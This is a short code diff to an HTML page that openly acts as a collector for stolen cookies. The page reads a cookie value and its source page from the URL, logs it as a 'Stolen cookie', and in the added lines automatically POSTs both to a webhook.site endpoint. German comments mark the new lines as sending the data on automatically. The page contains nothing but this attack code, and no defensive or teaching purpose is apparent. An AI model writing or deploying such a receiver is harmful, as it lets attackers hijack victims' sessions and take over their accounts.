@@ -1,15 +1,28 @@
 <html>
 <body>
 <script>
-  const params = new URLSearchParams(window.location.search);
-  const cookie = params.get('cookie');
-  const url = params.get('url') || document.referrer;
+const params = new URLSearchParams(window.location.search);
+const cookie = params.get('cookie');
+const url = params.get('url') || document.referrer;
 
-  console.log("Stolen cookie:", cookie);
+// LOGGE in Konsole (zum Testen)
+console.log("Stolen cookie:", cookie);
 
-  document.write("<h1>Cookie received:</h1>");
-  document.write("<p>" + cookie + "</p>");
-  document.write("<p>From page: " + url + "</p>");
+// AUTOMATISCH AN WEBHOOK SENDEN
+fetch('https://webhook.site/3adfae13-ca8b-41c6-842e-2ab0cd3a48e9', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookie: cookie,
+        from: url
+    }),
+    headers: {
+        'Content-Type': 'application/json'
+    }
+});
+
+document.write("<h1>Cookie received:</h1>");
+document.write("<p>" + cookie + "</p>");
+document.write("<p>From page: " + url + "</p>");
 </script>
 </body>
 </html>
